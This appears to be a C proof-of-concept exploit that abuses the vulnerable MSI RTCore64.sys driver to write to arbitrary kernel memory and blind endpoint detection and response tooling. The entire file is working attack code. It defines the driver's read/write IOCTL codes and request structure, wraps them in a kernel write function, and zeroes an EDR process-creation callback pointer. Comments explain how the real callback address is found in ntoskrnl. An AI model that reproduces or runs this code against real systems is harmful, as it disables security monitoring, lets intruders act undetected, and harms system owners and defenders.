#include <windows.h>
#include <stdio.h>

// MSI RTCore64.sys IOCTLs for arbitrary memory access
#define RTCORE64_READ32  0x80002048
#define RTCORE64_WRITE32 0x8000204C

typedef struct _RTCORE64_MEMORY_REQ {
    DWORD Pad0;
    DWORD64 Address;
    DWORD Pad1;
    DWORD Value;
    DWORD Size;
} RTCORE64_MEMORY_REQ;

// Fox's arbitrary kernel write primitive
BOOL WriteKernelMemory32(HANDLE hDevice, DWORD64 address, DWORD value) {
    RTCORE64_MEMORY_REQ req = {0};
    req.Address = address;
    req.Value = value;
    req.Size = 4;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDevice, RTCORE64_WRITE32, &req, sizeof(req), &req, sizeof(req), &bytesReturned, NULL);
}

int main() {
    // 1. Open a handle to the loaded vulnerable driver
    HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open RTCore64 device. Make sure the driver is loaded.\n");
        return -1;
    }

    printf("[+] RTCore64 handle acquired. We have Ring 0 R/W.\n");

    // 2. In a real scenario, you dynamically resolve PspCreateProcessNotifyRoutine
    // by loading ntoskrnl.exe locally, pattern scanning for the array, and rebasing it.
    // For this PoC, assume we calculated the target EDR callback pointer address.
    DWORD64 edrCallbackAddress = 0xFFFFF80012345678; // Example kernel address

    printf("[!] Target EDR callback located at: 0x%llX\n", edrCallbackAddress);

    // 3. Nullify the high and low 32-bit parts of the pointer to blind the EDR
    printf("[+] Zeroing out EDR callback pointer...\n");
    
    if (WriteKernelMemory32(hDevice, edrCallbackAddress, 0x00000000) &&
        WriteKernelMemory32(hDevice, edrCallbackAddress + 4, 0x00000000)) {
        printf("[+] EDR successfully blinded. Process creation telemetry is dead.\n");
    } else {
        printf("[-] Kernel write failed.\n");
    }

    CloseHandle(hDevice);
    return 0;
}